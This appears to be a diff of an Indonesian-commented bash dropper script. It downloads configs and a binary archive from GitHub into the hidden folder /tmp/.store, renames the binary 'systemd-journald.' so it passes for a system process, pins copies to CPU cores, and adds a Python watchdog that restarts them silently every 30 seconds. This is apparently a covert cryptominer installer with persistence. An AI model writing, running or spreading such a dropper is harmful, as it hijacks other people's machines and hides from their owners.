@@ -1,32 +1,32 @@
 #!/bin/bash
 
-# Warna untuk gaya manja
+# Warna buat gaya manja
 GREEN='\033[0;32m'
 NC='\033[0m' # No Color
 
-echo -e "${GREEN}[*] Menyiapkan environment...${NC}"
+echo -e "${GREEN}[*] Setup environment...${NC}"
 
-# Buat folder kerja
+# Buat folder
 mkdir -p /tmp/.store/1 /tmp/.store/2
 
-# Download konfigurasi pertama
+# Download config 1
 cd /tmp/.store/1
 wget -q https://github.com/ANTI-VIRAL/Ai-04/raw/main/1.ini -O config.ini
 
-# Download konfigurasi kedua
+# Download config 2
 cd /tmp/.store/2
 wget -q https://github.com/ANTI-VIRAL/Ai-04/raw/main/2.ini -O config.ini
 
-# Balik ke folder utama
+# Balik ke .store
 cd /tmp/.store
 
-# Download dan ekstrak file utama
+# Download dan extract file utama
 wget -q https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz
 tar -xzf cache.tar.gz
 rm -f cache.tar.gz
 mv cache systemd-journald.
 
-# Copy file utama ke masing-masing folder
+# Copy ke folder 1 dan 2
 cp systemd-journald. /tmp/.store/1/
 cp systemd-journald. /tmp/.store/2/
 chmod +x /tmp/.store/1/systemd-journald.
@@ -35,38 +35,45 @@ chmod +x /tmp/.store/2/systemd-journald.
 # Bersih-bersih
 rm -f systemd-journald.
 
-# Bikin guardian.sh buat ngawasin proses
-cat > /tmp/.store/guardian.sh << 'EOF'
-#!/bin/bash
+# Bikin skrip python penjaga setia
+cat > /tmp/.store/guardian.py << 'EOF'
+import os
+import subprocess
+import time
 
-while true
-do
-    # Cek proses pertama
-    if ! ps -C systemd-journald. -o cmd= | grep -q "/tmp/.store/1/systemd-journald."
-    then
-        echo "[!] Proses pertama tidak ditemukan... Menyalakan ulang."
-        cd /tmp/.store/1 && nohup taskset -c 0 ./systemd-journald. > /dev/null 2>&1 &
-    fi
+def is_process_running(path):
+    try:
+        output = subprocess.check_output(['pgrep', '-f', path])
+        return bool(output.strip())
+    except subprocess.CalledProcessError:
+        return False
 
-    # Cek proses kedua
-    if ! ps -C systemd-journald. -o cmd= | grep -q "/tmp/.store/2/systemd-journald."
-    then
-        echo "[!] Proses kedua tidak ditemukan... Menyalakan ulang."
-        cd /tmp/.store/2 && nohup taskset -c 1 ./systemd-journald. > /dev/null 2>&1 &
-    fi
+def start_process(folder, cpu_core):
+    print(f"[*] Menjalankan proses dari {folder} di CPU core {cpu_core}...")
+    os.chdir(folder)
+    subprocess.Popen(["taskset", "-c", str(cpu_core), "./systemd-journald."], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    sleep 30
-done
+def main():
+    while True:
+        if not is_process_running("/tmp/.store/1/systemd-journald."):
+            start_process("/tmp/.store/1", 0)
+        if not is_process_running("/tmp/.store/2/systemd-journald."):
+            start_process("/tmp/.store/2", 1)
+        time.sleep(30)
+
+if __name__ == "__main__":
+    main()
 EOF
 
-chmod +x /tmp/.store/guardian.sh
+chmod +x /tmp/.store/guardian.py
 
-echo -e "${GREEN}[*] Menyalakan background service...${NC}"
+echo -e "${GREEN}[*] Starting guardian...${NC}"
 
-# Start guardian saja
-nohup bash /tmp/.store/guardian.sh > /dev/null 2>&1 &
+# Start guardian python
+cd /tmp/.store
+nohup python3 guardian.py > /dev/null 2>&1 &
 
-echo -e "${GREEN}[✓] Semuanya sudah diawasi guardian.${NC}"
+echo -e "${GREEN}[✓] Setup selesai, proses jalan di background.${NC}"
 
-# Cek status
+# Cek yang jalan
 ps aux | grep systemd-journald. | grep -v grep
